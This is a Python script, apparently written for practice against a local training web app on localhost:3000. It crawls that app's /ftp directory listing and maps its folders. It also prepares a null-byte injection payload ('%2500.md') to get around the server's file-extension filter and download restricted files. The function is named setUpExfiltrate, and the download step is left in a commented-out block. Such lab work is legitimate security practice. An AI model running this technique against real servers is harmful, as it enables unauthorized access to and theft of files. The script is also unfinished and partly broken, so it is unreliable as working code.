#!/usr/bin/env python3
import os
import requests
from bs4 import BeautifulSoup

""" Programming concept:
multithread, each thread handles one dir/subdir

target_dict = {root:[list of files], root/dir1:[list of files], root/dir2:[list of files]}
"""

# Methods Declaration
def getDomain(url):
	domain = url.replace('/', ' ')
	domain = ' '.join(domain.split())
	domain = list(domain.split(" "))[1]
	return domain

def getProtocol(url):
	protocol = url.replace('/', ' ')
	protocol = ' '.join(protocol.split())
	protocol = list(protocol.split(" "))[0]
	return protocol

def getPath(url):
	protocolDomain = getProtocol(url) + '//' + getDomain(url) + '/'
	if protocolDomain in url:
		return url.replace(protocolDomain, '')
	else:
		return ""


def isDir(target, url):
	tempR = requests.get(url + '/' + target.text + '/')
	if tempR.status_code == 200:
		# current target is a URL
		print(f"{target.text} is a directory")
		return True
	else:
		return False


def setUpExfiltrate(t_dict, t_dirList, t_url):
	# currentDir = path of t_url
	currentDir = getPath(t_url)	

	# Add this for root dir
	addToDict(t_dict, currentDir, [])

	# Get request
	r = requests.get(t_url)

	soup = BeautifulSoup(r.text, 'lxml')
	# Make this dynamic, consider a third - fifth param tag_list, class_list, id_list
	targets = soup.find_all('span', class_ = 'name')

	payload = '%2500.md'

	for target in targets:
		#print(target.text)
		if isDir(target, t_url) == True:
			# Update t_dict keys
			newKey = currentDir + '/' + target.text # currentDir/newKey
			addToDict(t_dict, newKey, [])

			# Append to dirList
			t_dirList.append(newKey + '/')

			# OS add outside after buidling the t_dict
			#os.makedirs('/' + target.text, exist_ok = True)
			targets.remove(target)
		else:
			# eg. t_dict[root/subdir1]
			t_dict[currentDir].append(target.text)


def addToDict(t_dict, t_key, t_value):
	t_dict[t_key] = t_value
# -------------------------------------------------------------

# MAIN LOOP

# User input temp variables
cur_path = os.getcwd()
folders = []
target_dict = {}

url = 'http://localhost:3000/ftp'

# Payload to append for null byte injection 
payload = '%2500.md'

setUpExfiltrate(target_dict, folders, url)

print(target_dict)

"""
	else:
		
		print(f"{target.text} is a file")
		# download file
		print("Downloading file...\n")
		# add payload, allow redirection for download
		d_r = requests.get(url + target.text + payload, allow_redirects = True)		
		save_path = rootName # current folder
		# set up path/filename
		writeName = os.path.join(save_path, target.text)
		# save content to writeName
		open(writeName, 'wb').write(d_r.content)
		"""

#print(folders)
#print(targets)
#print(r.text)
